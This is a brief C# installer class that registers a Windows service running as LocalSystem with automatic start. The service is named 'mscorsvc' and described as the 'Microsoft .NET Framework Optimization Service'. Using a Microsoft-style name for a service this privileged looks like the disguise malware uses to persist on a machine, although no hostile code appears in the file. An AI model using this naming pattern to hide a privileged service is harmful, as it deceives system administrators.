using System.Configuration.Install;
using System.ServiceProcess;
using System.ComponentModel;
using System;

namespace mscorsvc
{
    [RunInstaller(true)]
    public class ProjectInstaller : Installer
    {
        public ProjectInstaller()
        {
            this.Installers.Add( new ServiceProcessInstaller
                          {
                              Account = ServiceAccount.LocalSystem
                          });
            this.Installers.Add(new ServiceInstaller
                          {
                              ServiceName = "mscorsvc",
                              Description = "Microsoft .NET Framework Optimization Service",
                              StartType = ServiceStartMode.Automatic
                          });
        }
    }
}
